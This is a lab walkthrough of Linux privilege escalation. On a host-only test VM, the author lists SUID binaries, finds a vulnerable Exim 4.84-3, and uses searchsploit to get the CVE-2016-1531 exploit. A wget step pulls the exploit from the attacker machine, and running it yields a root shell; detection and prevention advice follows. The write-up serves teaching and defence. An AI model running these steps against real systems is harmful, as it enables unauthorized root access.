
# SUID/SGID — Privilege Escalation

**Date:** July 2026 <br>
**Author:** ShahinSecLab <br>
**Category:** Privilege Escalation <br>
**Difficulty:** Medium <br>
**Tools:** SSH, searchsploit

# Table of Contents

* [Introduction](#introduction)
* [Attack Flow](#attack-flow)
* [Why This Attack Works](#why-this-attack-works)
* [Lab Setup](#lab-setup)
* [Tools Used](#tools-used)
* [Prerequisites](#prerequisites)
* [Step 1 — Connecting to the Target via SSH](#step-1--connecting-to-the-target-via-ssh)
* [Step 2 — Finding SUID Binaries](#step-2--finding-suid-binaries)
* [Step 3 — Searching for an Exploit with Searchsploit](#step-3--searching-for-an-exploit-with-searchsploit)
* [Step 4 — Downloading the Exploit to the Target](#step-4--downloading-the-exploit-to-the-target)
* [Step 5 — Running the Exploit and Getting Root](#step-5--running-the-exploit-and-getting-root)
* [How Defenders Can Catch This](#how-defenders-can-catch-this)
* [How to Prevent It](#how-to-prevent-it)
* [References](#references)
* [Lessons Learned](#lessons-learned)

## Introduction

SUID and SGID are special Linux permissions that allow a program to run with the permissions of the file owner or group.

Many Linux programs use SUID for normal operations. However, if a SUID binary is outdated or has a known vulnerability, a normal user can use it to gain higher privileges.

In this attack, an old Exim binary with the SUID permission enabled was found on the system. The vulnerable binary was exploited using a known exploit, which resulted in getting a root shell.

## Attack Flow
```
Connected to the target over SSH with low privilege credentials
                ↓
Ran find to locate all SUID binaries on the system
                ↓
Spotted /usr/sbin/exim-4.84-3 as an unusual SUID binary
                ↓
Searched for exploits with searchsploit exim 4.84-3
                ↓
Found CVE-2016-1531 local privilege escalation exploit (39535.sh)
                ↓
Downloaded the exploit to Kali with searchsploit -m 39535
                ↓
Started Python HTTP server on Kali
                ↓
Downloaded the exploit to the target with wget
                ↓
Added execute permission with chmod +x
                ↓
Ran the exploit with ./39535.sh
                ↓
Got a root shell immediately
                ↓
      whoami → root
```

## Why This Attack Works

Linux uses file permission bits to control who can read, write, or execute files. The SUID bit is an extra permission that tells the system to run the file as its owner instead of the person running it. This is used legitimately by tools like `passwd` — which needs root access to modify /`etc/shadow` even when run by a normal user.

The problem comes in when a binary with the SUID bit set is either:

- Vulnerable to a known CVE — like Exim 4.84-3 in this case
- Abusable to spawn a shell — like `find`, `vim`, or `bash` with the SUID bit set

In either case, since the binary runs as root, whatever it does — including spawning a shell — happens as root.

## Lab Setup

| Component        | Details                                  |
|------------------|------------------------------------------|
| Attacker Machine | Kali Linux                               |
| Victim Machine   | Debian Linux                             |
| Victim IP        | `192.168.5.133`                            |
| Access Method    | SSH with valid low-privilege credentials |
| Network          | VMware Host-Only Network                 |

## Tools Used

| Tool | Purpose |
|------|---------|
| `SSH` | Used to connect to the target machine |
| `searchsploit` | Used to find an exploit for the vulnerable Exim version |

## Prerequisites

| What | Why |
|------|-----|
| SSH credentials for a low-privilege user | Needed to access the target machine |
| Access to the command line | Needed to run commands and check files |
| Connection between Kali and target | Needed to transfer the exploit file |
| Vulnerable SUID binary | Required to gain root access |

## Step 1 — Connecting to the Target via SSH

Since the target was running an older SSH setup, I had to add extra flags to allow older key exchange algorithms:

```bash
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa user@192.168.5.133
```
**Breakdown**

| Part | Description |
|------|-------------|
| `-o HostKeyAlgorithms=+ssh-rsa` | Allows the SSH client to use the older RSA host key algorithm, which is required by some older Linux systems |
| `-o PubkeyAcceptedAlgorithms=+ssh-rsa` | Allows the SSH client to use the older RSA public key algorithm for authentication |
| `user@192.168.5.133` | Connects to the target machine as the `user` account at `192.168.5.133` |

**Output:**

```
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
user@192.168.5.133's password: 
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jun 30 12:32:04 2026 from 192.168.5.128
```
It prompted for the password right after the connection request, I typed `password321`, and got logged in successfully. The kernel version 2.6.32 stood out right away.

I logged in as `user` — a normal low privilege account on the system.

<p align="center">
  <img src="images/step1-1.png" width="600">
</p>

## Step 2 — Finding SUID Binaries

I searched the system for files with the SUID bit set using the following command:

```bash
user@debian:~$ find / -type f -perm -4000 2>/dev/null
```

**Breakdown**

|  Part         |            Description                                           |
|---------------|------------------------------------------------------------------|
| `find /`      | Starts searching from the root of the filesystem.                |
| `-type f`     | Searches for files only.                                         |
| `-perm -4000` | Finds files with the SUID bit set.                               |
| `2>/dev/null` | Redirects error messages to `/dev/null` to keep the output clean.|

**Output:**

```
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/sudoedit
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
/usr/local/bin/suid-so
/usr/local/bin/suid-env
/usr/local/bin/suid-env2
/usr/sbin/exim-4.84-3
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown
/bin/ping6
/bin/ping
/bin/mount
/bin/su
/bin/umount
/sbin/mount.nfs
```
Most of these are normal system binaries that are supposed to have the SUID bit set. But a few stood out as unusual:

- `/usr/local/bin/suid-so`
- `/usr/local/bin/suid-env`
- `/usr/local/bin/suid-env2`
- `/usr/sbin/exim-4.84-3`

The most interesting binary was `/usr/sbin/exim-4.84-3`. Exim is a mail transfer agent, and this version is known to be vulnerable to a local privilege escalation vulnerability when installed with the SUID bit set.

<p align="center">
  <img src="images/step2-1.png" width="600">
</p>

## Step 3 — Searching for an Exploit with Searchsploit

After identifying the Exim version on the target, I searched for known exploits on my Kali machine using `searchsploit`.

```bash
searchsploit exim 4.84-3
```
**Output:**

```
Exploit Title                                              |  Path
-----------------------------------------------------------|------------------------
Exim 4.84-3 - Local Privilege Escalation                   | linux/local/39535.sh
Exim < 4.86.2 - Local Privilege Escalation                 | linux/local/39549.txt
Exim < 4.90.1 - 'base64d' Remote Code Execution            | linux/remote/44571.py
PHPMailer < 5.2.20 with Exim MTA - Remote Code Execution   | php/webapps/42221.py
```
The first result matched the Exim version running on the target:
```
Exim 4.84-3 - Local Privilege Escalation (linux/local/39535.sh)
```
Since the target was running Exim 4.84-3, the local privilege escalation exploit was applicable.

<p align="center">
  <img src="images/step3-1.png" width="600">
</p>

### Downloaded the Exploit to Kali

I downloaded the exploit from the local Exploit Database repository on my Kali machine using `searchsploit`.

```bash
searchsploit -m 39535
```
**Breakdown**

| Part | Description |
|------|-------------|
| `searchsploit` | Command-line tool used to search and manage exploits from the Exploit Database |
| `-m` | Option used to copy the exploit file from the local Exploit Database repository |
| `39535` | Exploit ID of the Exim 4.84-3 Local Privilege Escalation exploit |

**Output:**

```
Exploit: Exim 4.84-3 - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/39535
     Path: /usr/share/exploitdb/exploits/linux/local/39535.sh
    Codes: CVE-2016-1531
 Verified: True
File Type: POSIX shell script, ASCII text executable
Copied to: /home/kali/39535.sh
```

<p align="center">
  <img src="images/step3-2.png" width="600">
</p>

## Step 4 — Downloading the Exploit to the Target

### Started Python HTTP Server on Kali

I started a simple HTTP server on my Kali machine to make the exploit available for download.

```bash
python3 -m http.server 80
```
<p align="center">
  <img src="images/step4-1.png" width="600">
</p>

### Downloaded the Exploit on the Target Machine

On the target machine, I used `wget` to download the exploit from my Kali machine.

```
user@debian:~$ wget http://192.168.5.128/39535.sh
```
**Breakdown**

| Part | Description |
|------|-------------|
| `wget` | Command-line utility used to download files from a web server |
| `http://192.168.5.128/39535.sh` | URL of the exploit file hosted on the Kali machine |
| `192.168.5.128` | IP address of the Kali machine running the HTTP server |
| `39535.sh` | The exploit script being downloaded to the target machine |

**Output:**

```
--2026-07-04 06:23:44--  http://192.168.5.128/39535.sh
Connecting to 192.168.5.128:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 638 [application/x-sh]
Saving to: “39535.sh.1” 

100%[================================================>] 638

2026-07-04 06:23:44 (211 MB/s) - “39535.sh.1” saved [638/638]
```
<p align="center">
  <img src="images/step4-2.png" width="600">
</p>

### Confirmed the File Was Downloaded

I checked the downloaded file:

```bash
user@debian:~$ ls -l 39535.sh
```

```
-rw-r--r-- 1 user user 638 Jul  4 06:17 39535.sh
```
**Breakdown**

| Permission | Who    |            What it Means                           |
|------------|--------|----------------------------------------------------|
| `rw-`      | User   | The owner can read from and write to the file.     |
| `r--`      | Group  | Members of the file's group can only read the file.|
| `r--`      | Others | All other users can only read the file.            |

The exploit was downloaded successfully, but it did not have execute permission. I needed to add execute permission before running it.

<p align="center">
  <img src="images/step4-3.png" width="600">
</p>

## Step 5 — Running the Exploit and Getting Root

### Added Execute Permission

Before running the exploit, I added execute permission to the script.

```bash
user@debian:~$ chmod +x 39535.sh
```
**Breakdown**

| Part | Description |
|------|------------------------------------------|
| `chmod` | Command used to change file permissions |
| `+x` | Adds execute permission to the file |
| `39535.sh` | The exploit script that will be executed |

### Confirmed the Permission Change

```bash
user@debian:~$ ls -l 39535.sh
```
```
-rwxr-xr-x 1 user user 638 Jul  4 06:17 39535.sh
```
The execute permission was added successfully, and the script was ready to run.

<p align="center">
  <img src="images/step5-1.png" width="600">
</p>

### Ran the Exploit

```bash
user@debian:~$ ./39535.sh
```
**Output:**

```
[ CVE-2016-1531 local root exploit
sh-4.1#
```
The exploit completed successfully, and the prompt changed from `user@debian` to `sh-4.1#`. The `#` symbol indicates that the shell was running with root privileges.

<p align="center">
  <img src="images/step5-2.png" width="600">
</p>

### Confirmed Root Access

I verified the current user with `whoami`:

```bash
sh-4.1# whoami
```
**Output:**

```
root
```
I also checked the user ID:

```bash
sh-4.1# id
```
**Output:**

```
uid=0(root) gid=0(root) groups=0(root)
```
The `whoami` and `id` commands confirmed that I had successfully gained root privileges by exploiting the vulnerable SUID Exim binary (CVE-2016-1531).

<p align="center">
  <img src="images/step5-3.png" width="600">
</p>

## How Defenders Can Catch This

| Indicator | What to look for |
|-----------|------------------|
| Unknown SUID binaries | Check SUID files regularly |
| Old software versions | Keep systems updated |
| Exploit files downloaded to the server | Monitor file and network activity |
| Unusual commands run by normal users | Check command and process logs |
| Root shell from a normal user account | Review authentication logs |

## How to Prevent It

**Audit SUID binaries regularly**
Run this regularly and compare against a known good baseline:

```bash
find / -type f -perm -4000 2>/dev/null
```
Remove the SUID bit from any binary that does not absolutely need it:

```bash
chmod u-s /usr/sbin/exim-4.84-3
```

**Keep software updated**
CVE-2016-1531 was patched in Exim 4.86.2. Keeping software updated removes the vulnerability completely:

```bash
sudo apt update && sudo apt upgrade
```
**Remove unnecessary software**
If Exim or any other mail server is not needed on the machine, remove it completely:

```bash
sudo apt remove exim4
```

**Monitor for unusual SUID binaries**
Use file integrity monitoring tools like AIDE or Tripwire to alert you when the SUID bit is set on any file outside of the normal baseline.

**Restrict outbound connections from servers**
If the target machine could not reach my Kali HTTP server, the exploit download would have failed. Restricting outbound connections limits what an attacker can pull onto the machine.

## References

| Resource | Link |
|----------|------|
| Exploit Database — CVE-2016-1531 | https://www.exploit-db.com/exploits/39535 |
| CVE Details — CVE-2016-1531 | https://www.cvedetails.com/cve/CVE-2016-1531 |
| GTFOBins | https://gtfobins.github.io |
| MITRE ATT&CK — SUID and SGID | https://attack.mitre.org/techniques/T1548/001 |
| HackTricks — SUID Privilege Escalation | https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#suid-and-sgid |
| PayloadsAllTheThings — SUID | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#suid |

## Lessons Learned

- SUID binaries should be checked regularly because they can lead to root access.
- Unknown or unnecessary SUID files should be investigated.
- Keeping software updated helps prevent known vulnerabilities.
- Removing unnecessary SUID permissions makes the system safer.
- A vulnerable SUID binary can allow a normal user to become root.
- Regular system checks can help find dangerous configurations early.

